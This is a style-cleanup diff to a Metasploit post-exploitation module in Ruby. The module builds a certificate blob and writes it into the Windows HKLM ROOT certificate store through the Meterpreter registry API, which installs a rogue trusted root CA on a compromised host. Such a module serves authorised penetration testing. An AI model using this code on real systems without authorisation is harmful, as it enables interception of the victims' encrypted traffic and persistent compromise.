@@ -42,8 +42,8 @@ class MetasploitModule < Msf::Post
     # Check file path
     begin
       ::File.stat(certfile)
-    rescue
-      print_error("CAFILE not found")
+    rescue StandardError
+      print_error('CAFILE not found')
       return
     end
 
@@ -67,23 +67,23 @@ class MetasploitModule < Msf::Post
     derRay = derLength.scan(/../)
     hexDerLength = [ derRay[1], derRay[0] ]
 
-    certder = loadedcert.to_der.each_byte.collect { |val| "%02X" % val }
+    certder = loadedcert.to_der.each_byte.collect { |val| '%02X' % val }
 
-    bblob = [ "04", "00", "00", "00", "01", "00", "00", "00", "10", "00", "00", "00" ]
+    bblob = [ '04', '00', '00', '00', '01', '00', '00', '00', '10', '00', '00', '00' ]
     bblob += certmd5
-    bblob += [ "03", "00", "00", "00", "01", "00", "00", "00", "14", "00", "00", "00" ]
+    bblob += [ '03', '00', '00', '00', '01', '00', '00', '00', '14', '00', '00', '00' ]
     bblob += certsha1
-    bblob += [ "14", "00", "00", "00", "01", "00", "00", "00", "14", "00", "00", "00" ]
+    bblob += [ '14', '00', '00', '00', '01', '00', '00', '00', '14', '00', '00', '00' ]
     bblob += cskiray
-    bblob += [ "20", "00", "00", "00", "01", "00", "00", "00" ]
+    bblob += [ '20', '00', '00', '00', '01', '00', '00', '00' ]
     bblob += hexDerLength
-    bblob += [ "00", "00" ]
+    bblob += [ '00', '00' ]
     bblob += certder
 
-    blob = bblob.map(&:hex).pack("C*")
+    blob = bblob.map(&:hex).pack('C*')
 
-    cleancertsha1 = certsha1.to_s.gsub(/[\s\[\\\"\]]/, '').gsub(/,/, '').upcase
-    catree = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\SystemCertificates\\ROOT\\Certificates"
+    cleancertsha1 = certsha1.to_s.gsub(/[\s\[\\"\]]/, '').gsub(/,/, '').upcase
+    catree = 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\SystemCertificates\\ROOT\\Certificates'
     entire_key = "#{catree}\\#{cleancertsha1}"
     root_key, base_key = client.sys.registry.splitkey(entire_key)
 
@@ -94,17 +94,17 @@ class MetasploitModule < Msf::Post
       open_key = nil
       open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ + 0x0000)
       values = open_key.enum_value
-      if (values.length > 0)
-        print_error("Key already exists!")
+      if !values.empty?
+        print_error('Key already exists!')
         return
       end
-    rescue
+    rescue StandardError
       open_key = nil
       open_key = client.sys.registry.create_key(root_key, base_key, KEY_WRITE + 0x0000)
       print_good("Successfully created key: #{entire_key}")
 
       open_key.set_value('Blob', REG_BINARY, blob)
-      print_good("CA inserted!")
+      print_good('CA inserted!')
     end
   end
 end
